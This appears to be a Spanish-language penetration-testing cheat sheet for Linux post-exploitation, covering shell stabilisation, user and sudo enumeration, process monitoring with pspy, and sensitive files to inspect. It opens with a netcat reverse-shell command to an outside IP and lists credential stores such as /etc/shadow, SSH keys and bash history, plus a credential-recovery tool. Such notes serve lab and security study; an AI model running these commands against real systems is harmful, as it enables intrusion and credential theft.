Estabilizar la shell

```bash
# Ver la shell que tengo
echo $0

nc -c sh 192.168.45.168 4444
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Cada vez que se obtenga acceso a un nuevo usuario o shell:

```bash
# 1. Identificar usuario actual
whoami && id

# 2. Verificar permisos sudo
sudo -l

# 3. Ver grupos del usuario
groups

# 4. Revisar directorio home
ls -la ~
cat ~/.bash_history
cat ~/.bashrc
cat ~/.bash_profile

# 5. Buscar archivos del usuario
find / -user $(whoami) 2>/dev/null

# 6. Ejecutar enumeración automática
./linpeas.sh

# 7. Verificar procesos propios
ps aux | grep $(whoami)
```

Herramientas para enumerar diferentes aspectos:

| Herramienta                                                                                   | Descripción                                                    |
| --------------------------------------------------------------------------------------------- | -------------------------------------------------------------- |
| [**LinEnum**](https://github.com/rebootuser/LinEnum)                                          | Script de enumeración de sistemas Linux                        |
| [**LinPEAS**](https://github.com/peass-ng/PEASS-ng)                                           | Herramienta de búsqueda de vectores de escalada de privilegios |
| [**LSE**](https://github.com/diego-treitos/linux-smart-enumeration) (Linux Smart Enumeration) | Enumeración inteligente con diferentes niveles de detalle      |
| [**LaZagne**](https://github.com/AlessandroZ/LaZagne)                                         | Recuperación de credenciales almacenadas                       |

Ver binarios que el usuario puede ejecutar como sudo:

``` bash
sudo -l
# https://gtfobins.org/
```

Información del kernel:

```bash
cat /proc/version
uname -a
```

Monitorear procesos con pspy (No usar cuando no se puede hacer Ctrl+C), qué buscar en la salida:
- Procesos ejecutados por root (UID=0)
- Scripts bash/sh ejecutados periódicamente
- Comandos con credenciales en texto plano
- Binarios con rutas relativas

```bash
# Descargar pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64

# Ejecutar
./pspy64

# Opciones útiles
./pspy64 -p    # Incluir comandos de procesos
./pspy64 -f    # Incluir eventos del sistema de archivos
./pspy64 -i 100 # Intervalo de escaneo en ms
```

Archivos importantes a revisar:

```bash
# Configuración de bash
~/.bashrc          # Puede contener aliases, funciones, variables
~/.bash_profile    # Ejecutado en login
~/.bash_history    # Historial de comandos (credenciales!)
~/.profile         # Configuración de perfil

# Configuración de aplicaciones
~/.mysql_history   # Historial MySQL
~/.ssh/            # Claves SSH
~/.gnupg/          # Claves GPG
~/.config/         # Configuraciones de aplicaciones

# Archivos del sistema
/etc/passwd        # Usuarios del sistema
/etc/shadow        # Hashes de contraseñas
/etc/group         # Grupos
/etc/sudoers       # Configuración sudo
/etc/crontab       # Tareas programadas
/etc/hosts         # Resolución de hosts

# Logs (pueden contener credenciales)
/var/log/auth.log  # Logs de autenticación
/var/log/syslog    # Logs del sistema
```

